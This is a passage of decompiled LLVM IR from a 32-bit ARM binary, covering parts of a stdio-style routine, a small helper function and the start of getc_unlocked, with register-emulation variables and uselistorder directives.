  store i8 %v1_14958, i8* %v4_14958, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_14960 = load i32, i32* %r6.global-to-local, align 4
  %v1_14960 = inttoptr i32 %v0_14960 to i32*
  store i32 112, i32* %v1_14960, align 4
  %v3_14960 = add i32 %v0_14960, 4
  %v4_14960 = inttoptr i32 %v3_14960 to i32*
  %v5_14960 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_14960, i32* %v4_14960, align 4
  %v0_14964 = load i32, i32* %r2.global-to-local, align 4
  %v1_14964 = load i32, i32* %r6.global-to-local, align 4
  %v2_14964 = add i32 %v1_14964, 8
  %v3_14964 = inttoptr i32 %v2_14964 to i32*
  store i32 %v0_14964, i32* %v3_14964, align 4
  %v0_14968 = load i32, i32* %r6.global-to-local, align 4
  %v1_14968 = add i32 %v0_14968, 12
  store i32 %v1_14968, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1496c

dec_label_pc_1496c:                               ; preds = %dec_label_pc_148e4, %.thread127, %dec_label_pc_1494c
  %v1_14978.pre = phi i32 [ %v2_14424, %.thread127 ], [ %v1_14968, %dec_label_pc_1494c ], [ %v1_14978.pre.pre, %dec_label_pc_148e4 ]
  %v2_1496c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1496c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14970

dec_label_pc_14970:                               ; preds = %dec_label_pc_14970, %dec_label_pc_1496c
  %v0_14970 = phi i32 [ %v2_1496c, %dec_label_pc_1496c ], [ %v4_14970, %dec_label_pc_14970 ]
  %stack_var_-188.0 = phi i32 [ %v3_142d4, %dec_label_pc_1496c ], [ %v2_1497c, %dec_label_pc_14970 ]
  %v1_14970 = inttoptr i32 %v0_14970 to i32*
  %v2_14970 = load i32, i32* %v1_14970, align 4
  store i32 %v2_14970, i32* %r3.global-to-local, align 4
  %v4_14970 = add i32 %v0_14970, 12
  store i32 %v4_14970, i32* %r2.global-to-local, align 4
  %v3_14978 = icmp ult i32 %v4_14970, %v1_14978.pre
  %v2_1497c = sub i32 %stack_var_-188.0, %v2_14970
  store i32 %v2_1497c, i32* %r0.global-to-local, align 4
  br i1 %v3_14978, label %dec_label_pc_14970, label %dec_label_pc_14988

dec_label_pc_14988:                               ; preds = %dec_label_pc_14970
  %v3_14988 = load i8, i8* %stack_var_-42, align 1
  %v4_14988 = sext i8 %v3_14988 to i32
  store i32 %v4_14988, i32* %r3.global-to-local, align 4
  store i32 %v4_14988, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1498c = icmp slt i8 %v3_14988, 0
  store i1 %v1_1498c, i1* %cpsr_n.global-to-local, align 1
  %v2_1498c = icmp eq i8 %v3_14988, 0
  store i1 %v2_1498c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1498c, label %bb270, label %bb269

bb269:                                            ; preds = %dec_label_pc_14988
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb270

bb270:                                            ; preds = %dec_label_pc_14988, %bb269
  %v1_149e0 = phi i32 [ %v4_14988, %dec_label_pc_14988 ], [ 1, %bb269 ]
  %v2_14994 = sub i32 %v2_1497c, %v1_149e0
  store i32 %v2_14994, i32* %r1.global-to-local, align 4
  %v2_14998 = ptrtoint i8* %stack_var_-42 to i32
  store i32 %v2_14998, i32* %r3.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_149a0 = icmp slt i32 %v2_14994, 0
  store i1 %v1_149a0, i1* %cpsr_n.global-to-local, align 1
  %v2_149a0 = icmp eq i32 %v2_14994, 0
  store i1 %v2_149a0, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-176, align 4
  %tmp271 = icmp slt i32 %v2_14994, 1
  br i1 %tmp271, label %dec_label_pc_14a08, label %dec_label_pc_149b4

dec_label_pc_149b4:                               ; preds = %bb270
  %v2_149b4 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_149b4, i32* %ip.global-to-local, align 4
  %v1_149b8 = add i32 %v2_149b4, 12
  %v2_149b8 = inttoptr i32 %v1_149b8 to i32*
  %v3_149b8 = load i32, i32* %v2_149b8, align 4
  store i32 %v3_149b8, i32* %r3.global-to-local, align 4
  %v1_149bc = and i32 %v3_149b8, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_149bc = icmp eq i32 %v1_149bc, 0
  store i1 %v2_149bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_149bc, label %dec_label_pc_149d4, label %dec_label_pc_149c4

dec_label_pc_149c4:                               ; preds = %dec_label_pc_149b4
  store i32 ptrtoint (i32* @global_var_1ae5b.574 to i32), i32* %r3.global-to-local, align 4
  %v1_149c8 = add i32 %v1_14978.pre, 12
  store i32 %v1_149c8, i32* %r5.global-to-local, align 4
  %v1_149cc = inttoptr i32 %v1_14978.pre to i32*
  store i32 160, i32* %v1_149cc, align 4
  %v3_149cc = add i32 %v1_14978.pre, 4
  %v4_149cc = inttoptr i32 %v3_149cc to i32*
  %v5_149cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_149cc, i32* %v4_149cc, align 4
  %v6_149cc = add i32 %v1_14978.pre, 8
  %v7_149cc = inttoptr i32 %v6_149cc to i32*
  %v8_149cc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_149cc, i32* %v7_149cc, align 4
  br label %dec_label_pc_14a0c

dec_label_pc_149d4:                               ; preds = %dec_label_pc_149b4
  store i32 %v2_149b4, i32* %r0.global-to-local, align 4
  %v1_149d8 = add i32 %v2_149b4, 16
  %v2_149d8 = inttoptr i32 %v1_149d8 to i32*
  %v3_149d8 = load i32, i32* %v2_149d8, align 4
  store i32 %v3_149d8, i32* %r3.global-to-local, align 4
  %v1_149dc = add i32 %v3_149d8, -48
  %v3_149dc = sub i32 47, %v3_149d8
  %v4_149dc = and i32 %v3_149dc, %v3_149d8
  %v5_149dc = icmp slt i32 %v4_149dc, 0
  store i1 %v5_149dc, i1* %cpsr_v.global-to-local, align 1
  %v6_149dc = icmp slt i32 %v1_149dc, 0
  store i1 %v6_149dc, i1* %cpsr_n.global-to-local, align 1
  %v7_149dc = icmp eq i32 %v3_149d8, 48
  store i1 %v7_149dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_149dc, label %dec_label_pc_149ec, label %bb272

bb272:                                            ; preds = %dec_label_pc_149d4
  store i32 %v2_1497c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14a08

dec_label_pc_149ec:                               ; preds = %dec_label_pc_149d4
  %v3_149ec = load i32, i32* %stack_var_-160, align 4
  store i32 %v1_14978.pre, i32* %r5.global-to-local, align 4
  %v2_149f4 = add i32 %v3_149ec, %v2_14994
  store i32 %v2_149f4, i32* %r3.global-to-local, align 4
  store i32 %v2_149f4, i32* %stack_var_-160, align 4
  br label %dec_label_pc_14a0c

dec_label_pc_14a00:                               ; preds = %dec_label_pc_14a14
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14a44

dec_label_pc_14a08:                               ; preds = %bb272, %bb270
  store i32 %v1_14978.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14a0c

dec_label_pc_14a0c:                               ; preds = %dec_label_pc_149ec, %dec_label_pc_149c4, %dec_label_pc_14a08
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_14a10 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_14a10, i32* %r4.global-to-local, align 4
  %v3_14a1c.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_14a14

dec_label_pc_14a14:                               ; preds = %dec_label_pc_14a3c, %dec_label_pc_14a0c
  %v0_14a14 = phi i32 [ %v1_14a34, %dec_label_pc_14a3c ], [ %v2_14a10, %dec_label_pc_14a0c ]
  %v1_14a14 = inttoptr i32 %v0_14a14 to i32*
  %v2_14a14 = load i32, i32* %v1_14a14, align 4
  store i32 %v2_14a14, i32* %r1.global-to-local, align 4
  %v3_14a14 = add i32 %v0_14a14, 4
  %v4_14a14 = inttoptr i32 %v3_14a14 to i32*
  %v5_14a14 = load i32, i32* %v4_14a14, align 4
  store i32 %v5_14a14, i32* %r2.global-to-local, align 4
  %v6_14a14 = add i32 %v0_14a14, 8
  %v7_14a14 = inttoptr i32 %v6_14a14 to i32*
  %v8_14a14 = load i32, i32* %v7_14a14, align 4
  store i32 %v8_14a14, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v3_14a1c.pre, i32* %ip.global-to-local, align 4
  store i32 84520, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_14a1c.pre)
  %v0_14a28 = load i32, i32* %r4.global-to-local, align 4
  %v1_14a28 = add i32 %v0_14a28, 4
  %v2_14a28 = inttoptr i32 %v1_14a28 to i32*
  %v3_14a28 = load i32, i32* %v2_14a28, align 4
  store i32 %v3_14a28, i32* %r3.global-to-local, align 4
  %v0_14a2c = load i32, i32* %r0.global-to-local, align 4
  %v2_14a2c = sub i32 %v0_14a2c, %v3_14a28
  %v4_14a2c = xor i32 %v0_14a2c, %v3_14a28
  %v5_14a2c = xor i32 %v2_14a2c, %v0_14a2c
  %v6_14a2c = and i32 %v5_14a2c, %v4_14a2c
  %v7_14a2c = icmp slt i32 %v6_14a2c, 0
  store i1 %v7_14a2c, i1* %cpsr_v.global-to-local, align 1
  %v8_14a2c = icmp slt i32 %v2_14a2c, 0
  store i1 %v8_14a2c, i1* %cpsr_n.global-to-local, align 1
  %v9_14a2c = icmp eq i32 %v0_14a2c, %v3_14a28
  store i1 %v9_14a2c, i1* %cpsr_z.global-to-local, align 1
  %v0_14a30 = load i32, i32* %r6.global-to-local, align 4
  %v2_14a30 = add i32 %v0_14a30, %v0_14a2c
  store i32 %v2_14a30, i32* %r6.global-to-local, align 4
  %v1_14a34 = add i32 %v0_14a28, 12
  store i32 %v1_14a34, i32* %r4.global-to-local, align 4
  br i1 %v9_14a2c, label %dec_label_pc_14a3c, label %dec_label_pc_14a00

dec_label_pc_14a3c:                               ; preds = %dec_label_pc_14a14
  %v1_14a3c = load i32, i32* %r5.global-to-local, align 4
  %v2_14a3c = sub i32 %v1_14a34, %v1_14a3c
  %v3_14a3c = icmp ult i32 %v1_14a34, %v1_14a3c
  %v4_14a3c = xor i32 %v1_14a3c, %v1_14a34
  %v5_14a3c = xor i32 %v2_14a3c, %v1_14a34
  %v6_14a3c = and i32 %v5_14a3c, %v4_14a3c
  %v7_14a3c = icmp slt i32 %v6_14a3c, 0
  store i1 %v7_14a3c, i1* %cpsr_v.global-to-local, align 1
  %v8_14a3c = icmp slt i32 %v2_14a3c, 0
  store i1 %v8_14a3c, i1* %cpsr_n.global-to-local, align 1
  %v9_14a3c = icmp eq i32 %v1_14a34, %v1_14a3c
  store i1 %v9_14a3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14a3c, label %dec_label_pc_14a14, label %dec_label_pc_14a44

dec_label_pc_14a44:                               ; preds = %dec_label_pc_14a3c, %dec_label_pc_14a00
  %v0_14a44 = phi i32 [ -1, %dec_label_pc_14a00 ], [ %v2_14a30, %dec_label_pc_14a3c ]
  store i32 %v0_14a44, i32* %r0.global-to-local, align 4
  %v2_14a4c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14a4c, i32* %r4.global-to-local, align 4
  ret i32 %v0_14a44

; uselistorder directives
  uselistorder i32 %v0_14a44, { 1, 0 }
  uselistorder i32 %v2_14a3c, { 1, 0 }
  uselistorder i32 %v1_14a3c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_14a34, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_14a2c, { 1, 0 }
  uselistorder i32 %v0_14a2c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_14a28, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14a14, { 2, 1, 0 }
  uselistorder i32 %v3_149d8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_149b4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1497c, { 0, 1, 3, 2 }
  uselistorder i32 %v4_14970, { 1, 2, 0 }
  uselistorder i32 %v0_14970, { 1, 0 }
  uselistorder i32 %v1_14978.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_14930, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_1492c, { 2, 1, 0 }
  uselistorder i32 %storemerge180, { 1, 0 }
  uselistorder i32 %v0_148f0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_148e4, { 3, 0, 1, 2 }
  uselistorder i32 %v2_148c0, { 1, 0 }
  uselistorder i32 %v2_148b8, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_148b0, { 1, 0 }
  uselistorder i32 %v0_148a8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_14890, { 1, 0 }
  uselistorder i32 %v1_1486c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1486c, { 1, 0, 2 }
  uselistorder i32 %v0_14844, { 3, 0, 1, 2 }
  uselistorder i1 %v2_14824, { 2, 1, 0 }
  uselistorder i32 %v2_147b0, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_147a0, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v1_148c8, { 2, 6, 0, 7, 5, 1, 3, 4, 8 }
  uselistorder i32 %v0_1480c, { 3, 0, 5, 4, 6, 7, 9, 1, 2, 8 }
  uselistorder i32 %v0_1474c, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_14730, { 1, 0 }
  uselistorder i32 %v1_14728, { 1, 2, 0 }
  uselistorder i32 %v2_1471c, { 1, 0 }
  uselistorder i32 %v1_1471c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1471c, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i32 %v1_14714, { 1, 0, 2 }
  uselistorder i32 %v0_1470c, { 3, 0, 1, 2 }
  uselistorder i1 %v3_146ec, { 1, 0 }
  uselistorder i32 %v2_146ec, { 1, 0 }
  uselistorder i32 %v2_146e8, { 3, 2, 1, 4, 5, 7, 0, 8, 6, 9 }
  uselistorder i1 %v7_146d4, { 1, 0 }
  uselistorder i32 %v1_146d8, { 2, 1, 0 }
  uselistorder i1 %v2_146c8, { 1, 0 }
  uselistorder i32 %v0_146c4, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_146ac, { 1, 0 }
  uselistorder i32 %stack_var_-192.7, { 1, 0, 2 }
  uselistorder i32 %v1_146a0, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_14658, { 1, 2, 0 }
  uselistorder i32 %v2_14654, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1463c, { 1, 3, 5, 6, 0, 4, 2 }
  uselistorder i1 %v2_14634, { 1, 0 }
  uselistorder i32 %v0_14640, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_1461c, { 1, 0 }
  uselistorder i32 %v0_14608, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i32 %v0_145fc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_145f0, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_145ec, { 0, 1, 3, 2 }
  uselistorder i32 %v0_145a4, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %stack_var_-192.6, { 1, 2, 0, 3 }
  uselistorder i32 %v2_144f4, { 1, 0 }
  uselistorder i32 %v11_144d0, { 1, 2, 0 }
  uselistorder double %v9_144d0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1447c, { 1, 0 }
  uselistorder i32 %v1_14468, { 3, 2, 0, 1 }
  uselistorder i32 %v0_144c8, { 1, 0 }
  uselistorder i32 %v5_14414, { 1, 0 }
  uselistorder i32 %v0_14400, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_14320.v1_143348, { 1, 0 }
  uselistorder i1 %not.v7_14328, { 1, 0 }
  uselistorder i1 %v7_14328, { 1, 2, 0 }
  uselistorder i32 %v1_14638, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32 %v1_14294, { 1, 0 }
  uselistorder i32* %stack_var_-79, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-43, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-42, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 5, 6, 10, 7, 2, 8, 9, 3, 11 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 10, 4, 5, 11, 6, 7, 8, 9 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 26, 25, 46, 28, 29, 33, 30, 31, 32, 34, 27, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 57, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 60, 61, 62, 63, 1, 64, 65, 66, 67, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 16, 17, 13, 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 10, 11, 12, 7, 8, 9, 13, 14, 15, 17, 16, 18, 19, 20, 1, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 13, 14, 15, 16, 17, 18, 3, 19, 20, 30, 29, 28, 31, 21, 22, 27, 23, 24, 12, 32, 25, 26, 1, 33, 34, 6, 11, 10, 8, 7, 35, 36, 5, 4, 2, 9, 37, 38, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11, 14, 12, 13, 15, 16, 0, 17, 18, 19, 20, 21 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 56, 18, 19, 20, 21, 22, 23, 24, 25, 55, 26, 27, 28, 29, 30, 54, 31, 32, 33, 34, 35, 36, 37, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 53, 17, 18, 19, 20, 21, 22, 23, 24, 25, 52, 26, 27, 28, 29, 51, 30, 31, 32, 33, 34, 35, 36, 50, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 56, 18, 19, 20, 21, 22, 23, 24, 25, 26, 55, 27, 28, 29, 30, 54, 31, 32, 33, 34, 35, 36, 37, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 17, { 13, 0, 3, 4, 1, 5, 6, 15, 14, 7, 8, 9, 2, 10, 11, 12 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F000000001AE5B) to float) to i32), { 1, 0 }
  uselistorder i32 520, { 1, 0 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder double 0.000000e+00, { 1, 3, 2, 0 }
  uselistorder i32 %arg4, { 1, 0, 5, 4, 3, 2, 7, 6, 8, 9, 10 }
  uselistorder i32 %arg3, { 0, 2, 1, 5, 4, 3, 6, 7, 8, 9, 11, 10, 12, 13 }
  uselistorder double %arg2, { 0, 1, 5, 6, 3, 4, 2, 7 }
  uselistorder label %dec_label_pc_14a0c, { 2, 0, 1 }
  uselistorder label %bb270, { 1, 0 }
  uselistorder label %dec_label_pc_1496c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_148e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_148b8, { 1, 0 }
  uselistorder label %.thread49, { 1, 0 }
  uselistorder label %dec_label_pc_14890, { 1, 0 }
  uselistorder label %dec_label_pc_1486c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14850, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1481c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14818, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14774, { 1, 0 }
  uselistorder label %bb257, { 1, 0 }
  uselistorder label %dec_label_pc_14764, { 1, 0 }
  uselistorder label %dec_label_pc_14758, { 1, 0 }
  uselistorder label %bb251, { 1, 0 }
  uselistorder label %bb249, { 1, 0 }
  uselistorder label %bb247, { 1, 0 }
  uselistorder label %.thread162, { 1, 0 }
  uselistorder label %bb243, { 1, 0 }
  uselistorder label %bb241, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb238, { 1, 0 }
  uselistorder label %dec_label_pc_14678, { 2, 1, 0 }
  uselistorder label %bb235, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_145a0, { 1, 0 }
  uselistorder label %dec_label_pc_14560, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_143f0, { 1, 0 }
  uselistorder label %dec_label_pc_1430c, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14a50:
  %v0_14a64 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_14a64, label %bb, label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14a50
  %v0_14a70.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a70.pr, label %bb7, label %.thread2

bb:                                               ; preds = %dec_label_pc_14a50
  %v1_14a68 = load i32, i32* @r4, align 4
  %v3_14a68 = xor i32 %v1_14a68, %arg1
  %v2_14a6c = sub i32 -1, %v3_14a68
  %v4_14a6c = icmp eq i32 %v3_14a68, -1
  br i1 %v4_14a6c, label %bb7, label %.thread2

bb7:                                              ; preds = %thread-pre-split, %bb
  %v9_14a745 = phi i32 [ %v2_14a6c, %bb ], [ %arg1, %thread-pre-split ]
  br label %.thread2

.thread2:                                         ; preds = %bb, %thread-pre-split, %bb7
  %v9_14a74 = phi i32 [ %v2_14a6c, %bb ], [ %arg1, %thread-pre-split ], [ %v9_14a745, %bb7 ]
  ret i32 %v9_14a74

; uselistorder directives
  uselistorder i32 %v2_14a6c, { 1, 0 }
  uselistorder i32 %v3_14a68, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_14a78 = load i32, i32* @r4, align 4
  store i32 %v3_14a78, i32* %stack_var_-8, align 4
  %v0_14a7c = load i32, i32* @r0, align 4
  %v1_14a7c = add i32 %v0_14a7c, 16
  %v2_14a7c = inttoptr i32 %v1_14a7c to i32*
  %v3_14a7c = load i32, i32* %v2_14a7c, align 4
  store i32 %v3_14a7c, i32* %r2.global-to-local, align 4
  %v1_14a80 = add i32 %v0_14a7c, 24
  %v2_14a80 = inttoptr i32 %v1_14a80 to i32*
  %v3_14a80 = load i32, i32* %v2_14a80, align 4
  %v3_14a84 = icmp ult i32 %v3_14a7c, %v3_14a80
  store i32 %v0_14a7c, i32* @r4, align 4
  br i1 %v3_14a84, label %bb, label %dec_label_pc_14a9c

bb:                                               ; preds = %entry
  %v2_14a8c = inttoptr i32 %v3_14a7c to i8*
  %v3_14a8c = load i8, i8* %v2_14a8c, align 1
  %v4_14a8c = zext i8 %v3_14a8c to i32
  store i32 %v4_14a8c, i32* %r0.global-to-local, align 4
  %v6_14a8c = add i32 %v3_14a7c, 1
  store i32 %v6_14a8c, i32* %r2.global-to-local, align 4
  store i32 %v6_14a8c, i32* %v2_14a7c, align 4
  br label %dec_label_pc_14b9c

dec_label_pc_14a9c:                               ; preds = %entry
  %v1_14a9c = inttoptr i32 %v0_14a7c to i8*
  %v2_14a9c = load i8, i8* %v1_14a9c, align 1
  %v3_14a9c = zext i8 %v2_14a9c to i32
  %v1_14aa0 = and i32 %v3_14a9c, 131
  %tmp22 = icmp ugt i32 %v1_14aa0, 128
  br i1 %tmp22, label %dec_label_pc_14abc, label %dec_label_pc_14aac

dec_label_pc_14aac:                               ; preds = %dec_label_pc_14a9c
  store i32 128, i32* @r1, align 4
  %v0_14ab0 = call i32 @__stdio_trans2r_o()
  store i32 %v0_14ab0, i32* %r0.global-to-local, align 4
  %v2_14ab4 = icmp eq i32 %v0_14ab0, 0
  br i1 %v2_14ab4, label %dec_label_pc_14aac.dec_label_pc_14abc_crit_edge, label %dec_label_pc_14b98

dec_label_pc_14aac.dec_label_pc_14abc_crit_edge:  ; preds = %dec_label_pc_14aac
  %v0_14abc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14abc

dec_label_pc_14abc:                               ; preds = %dec_label_pc_14aac.dec_label_pc_14abc_crit_edge, %dec_label_pc_14a9c
  %v2_14b08 = phi i32 [ %v0_14abc.pre, %dec_label_pc_14aac.dec_label_pc_14abc_crit_edge ], [ %v0_14a7c, %dec_label_pc_14a9c ]
  %v1_14abc = inttoptr i32 %v2_14b08 to i8*
  %v2_14abc = load i8, i8* %v1_14abc, align 1
  %v3_14abc = zext i8 %v2_14abc to i32
  store i32 %v3_14abc, i32* %r2.global-to-local, align 4
  %v1_14ac0 = add i32 %v2_14b08, 1
  %v2_14ac0 = inttoptr i32 %v1_14ac0 to i8*
  %v3_14ac0 = load i8, i8* %v2_14ac0, align 1
  %v4_14ac0 = zext i8 %v3_14ac0 to i32
  %v4_14ac4 = mul nuw nsw i32 %v4_14ac0, 256
  %v5_14ac4 = or i32 %v4_14ac4, %v3_14abc
  store i32 %v5_14ac4, i32* %r2.global-to-local, align 4
  %v1_14ac8 = and i32 %v3_14abc, 2
  %v2_14ac8 = icmp eq i32 %v1_14ac8, 0
  br i1 %v2_14ac8, label %dec_label_pc_14af8, label %dec_label_pc_14ad0

dec_label_pc_14ad0:                               ; preds = %dec_label_pc_14abc
  %tmp23 = urem i8 %v2_14abc, 2
  %v1_14ad0 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_14ad0
  %v4_14ad4 = and i32 %tmp18, 4
  %v5_14ad4 = add i32 %v4_14ad4, %v2_14b08
  %v1_14ad8 = add i32 %v5_14ad4, 36
  %v2_14ad8 = inttoptr i32 %v1_14ad8 to i8*
  %v3_14ad8 = load i8, i8* %v2_14ad8, align 1
  %v4_14ad8 = zext i8 %v3_14ad8 to i32
  %v1_14adc = add nsw i32 %v5_14ac4, -1
  store i32 %v1_14adc, i32* %r2.global-to-local, align 4
  %v3_14ae0 = sdiv i32 %v1_14adc, 256
  store i32 %v3_14ae0, i32* %r1.global-to-local, align 4
  store i32 %v4_14ad8, i32* %r0.global-to-local, align 4
  %v2_14aec = add i32 %v2_14b08, 40
  %v3_14aec = inttoptr i32 %v2_14aec to i32*
  store i32 0, i32* %v3_14aec, align 4
  %v0_14af0 = load i32, i32* %r1.global-to-local, align 4
  %v1_14af0 = trunc i32 %v0_14af0 to i8
  %v2_14af0 = load i32, i32* @r4, align 4
  %v3_14af0 = add i32 %v2_14af0, 1
  %v4_14af0 = inttoptr i32 %v3_14af0 to i8*
  store i8 %v1_14af0, i8* %v4_14af0, align 1
  br label %dec_label_pc_14b2c

dec_label_pc_14af8:                               ; preds = %dec_label_pc_14abc
  %v1_14af8 = add i32 %v2_14b08, 16
  store i32 %v1_14af8, i32* %r1.global-to-local, align 4
  %v1_14afc = inttoptr i32 %v1_14af8 to i32*
  %v2_14afc = load i32, i32* %v1_14afc, align 4
  store i32 %v2_14afc, i32* %r1.global-to-local, align 4
  %v3_14afc = add i32 %v2_14b08, 20
  %v4_14afc = inttoptr i32 %v3_14afc to i32*
  %v5_14afc = load i32, i32* %v4_14afc, align 4
  %v9_14b00 = icmp eq i32 %v5_14afc, %v2_14afc
  br i1 %v9_14b00, label %dec_label_pc_14b10, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14af8
  %v2_14b04 = inttoptr i32 %v2_14afc to i8*
